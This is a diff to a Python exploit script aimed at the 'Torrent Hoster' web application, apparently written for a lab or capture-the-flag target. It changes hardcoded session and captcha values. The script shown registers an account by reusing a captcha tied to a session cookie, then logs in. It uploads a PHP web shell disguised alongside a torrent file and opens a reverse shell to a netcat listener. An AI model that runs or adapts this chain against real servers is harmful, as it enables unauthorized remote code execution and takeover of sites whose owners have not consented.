@@ -3,6 +3,19 @@ import random
 import string
 import re
 
+
+############################################
+##    SCRIPT REQUIRES EXTERNAL VALUES     ##
+############################################
+# The captcha code is tied to the session
+# cookie and can be used multiple times
+# once a captcha code and session id are
+# obtained the script can register a user
+SESSION_ID = "11f30fa6ecfb52b3551c1dd66fb55347"
+CODE = "d12e5"
+#############################################
+
+
 def register_user():
     success_string = "Thank you for registering to Torrent Hoster  Your account information is:"
 
@@ -23,6 +36,7 @@ def register_user():
         print("[*] Username previously registered")
     elif f"Your Code is invalid" in r.text:
         print("[!] Error new captcha code is required in the script")
+        exit()
     else:
         print("[!] Error in registering user")
         exit()
@@ -120,13 +134,7 @@ def execute_shell(id):
     print("[!] Error in establishing a reverse shell connection. Is the netcat server running?")
 
 
-############################################
-## CHANGE CODE IF ERRORS IN REGISTRATION  ##
-############################################
-# One code can be used multiple times, this value just needs 
-# to be obtained from the register page any code will do
-CODE = "7714c"
-COOKIE = {"PHPSESSID" : "d68ed85e55ad7e5f5ac47cd0774a8ecc"}
+COOKIE = {"PHPSESSID" : SESSION_ID}
 TORRENT_FILE_PATH = "./sample.torrent"
 PAYLOAD_FILE_PATH = "./shell.php"
 
@@ -140,7 +148,7 @@ register_url = "users/index.php?mode=register"
 login_url = "login.php"
 upload_url = "torrents.php?mode=upload"
 
-username = "TestNJ5RUHLUT07Y4VD"
+username = "TestNJ5RHLUT07Y4VD"
 
 register_user()
 login(username)
